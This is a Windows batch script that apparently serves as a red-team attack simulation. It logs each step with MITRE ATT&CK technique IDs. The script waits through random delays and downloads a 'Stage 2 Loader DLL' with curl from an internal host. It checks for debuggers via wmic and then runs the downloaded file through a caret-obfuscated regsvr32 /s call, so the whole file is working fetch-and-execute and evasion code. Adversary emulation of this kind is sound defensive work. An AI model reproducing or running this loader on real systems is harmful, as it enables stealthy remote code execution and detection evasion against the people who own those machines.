@echo off
SETLOCAL EnableDelayedExpansion

REM ---------- PHR_ placeholder assignments (random-named SET variables) ----------
SET xqwer=%APPDATA%\11029\d5e28ad3
SET asdfg=b5f57ac6.txt
SET zxcvb=https://10.0.0.49/stage/2/icon.png?11029-7
SET qwert=BALAM-S2BO
SET yuioi=11029
SET hjklö=7
SET nm,kl=%PUBLIC%\\macula-simulations.log
SET poiuy=https://10.0.0.49

REM ---------- Cache timestamp once ----------
SET tsvar=!DATE!/!TIME!
SET logfile=!nm,kl!
SET agentname=!qwert!
SET simid=!yuioi!
SET outputdir=!xqwer!
SET outputfile=!asdfg!
SET heartbeat=!zxcvb!

REM ---------- 1. Initial delay (10-20s) ----------
timeout /t 15 /nobreak >nul

REM ---------- 2. Debug log: heartbeat_start ----------
echo [!tsvar!][DEBUG][!agentname!][!simid!]: heartbeat_start>> "!logfile!" 2>nul

REM ---------- 3. Download Stage 2 Loader DLL via curl ----------
curl -k -s -o "!outputdir!\!outputfile!" "!heartbeat!"
IF %ERRORLEVEL% EQU 0 (
    echo [!tsvar!][DEBUG][!agentname!][!simid!]: heartbeat_complete=0>> "!logfile!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!agentname!][!simid!]: heartbeat_failed=!ERRORLEVEL!>> "!logfile!" 2>nul
)

REM ---------- 4. Second delay (5-15s) ----------
ping -n 10 127.0.0.1 >nul

REM ---------- 5. Debug log: chdir_start ----------
echo [!tsvar!][DEBUG][!agentname!][!simid!]: chdir_start>> "!logfile!" 2>nul

REM ---------- 6. Change working directory ----------
cd /d "!outputdir!" >nul 2>&1
echo [!tsvar!][DEBUG][!agentname!][!simid!]: chdir_result=!ERRORLEVEL!>> "!logfile!" 2>nul

REM ---------- 7. Anti-analysis: Debugger check (if debugger detected, add random sleep) ----------
REM Check for common debugger processes (non-blocking, never aborts)
wmic process where "CommandLine like '%%windbg%%' or CommandLine like '%%x64dbg%%' or CommandLine like '%%devenv%%'" get ProcessID /format:csv 2>nul | find /i "ProcessId" >nul
IF !ERRORLEVEL! EQU 0 (
    SET /A debugdelay= %RANDOM% %% 3 + 2
    timeout /t !debugdelay! /nobreak >nul
)
REM Log evasion attempt
echo [!tsvar!][DEBUG][!agentname!][!simid!]: debugger_check_done>> "!logfile!" 2>nul

REM ---------- 8. Third delay (random 10-30s) ----------
SET /A rdelay=%RANDOM% %% 20 + 10
timeout /t !rdelay! /nobreak >nul

REM ---------- 9. Obfuscated LOLBIN invocation (regsvr32.exe /s) ----------
REM Use medium-to-heavy caret escapes and variable fragments
SET fra1=r^e^g^s^v^r
SET fra2=3^2^.
SET fra3=e^x^e
SET fra4=/^s
REM Combine fragments and execute (no extra spaces between fragments)
CALL SET cmd=%%fra1%%%%fra2%%%%fra3%% %fra4%
!cmd! "!outputdir!\!outputfile!" >nul 2>&1
SET lolbin_result=%ERRORLEVEL%

REM Log LOLBIN invocation
echo [!tsvar!][DEBUG][!agentname!][!simid!]: regsvr32_start>> "!logfile!" 2>nul
echo [!tsvar!][DEBUG][!agentname!][!simid!]: regsvr32_result=!lolbin_result!>> "!logfile!" 2>nul

REM ---------- 10. Log TTP outcomes ----------
REM T1218 – System Binary Proxy Execution
IF !lolbin_result! EQU 0 (
    echo [!tsvar!][TTP][!agentname!][!simid!]: T1218^^!System Binary Proxy Execution=OK:>> "!logfile!" 2>nul
) ELSE (
    echo [!tsvar!][TTP][!agentname!][!simid!]: T1218^^!System Binary Proxy Execution=FAIL:!lolbin_result!>> "!logfile!" 2>nul
)

REM T1497 – Virtualization/Sandbox Evasion (always considered executed)
echo [!tsvar!][TTP][!agentname!][!simid!]: T1497^^!Virtualization/Sandbox Evasion=OK:>> "!logfile!" 2>nul

REM T1027 – Obfuscated Files or Information (the script itself is obfuscated)
echo [!tsvar!][TTP][!agentname!][!simid!]: T1027^^!Obfuscated Files or Information=OK:>> "!logfile!" 2>nul

REM ---------- 11. Exit ----------
exit /b 0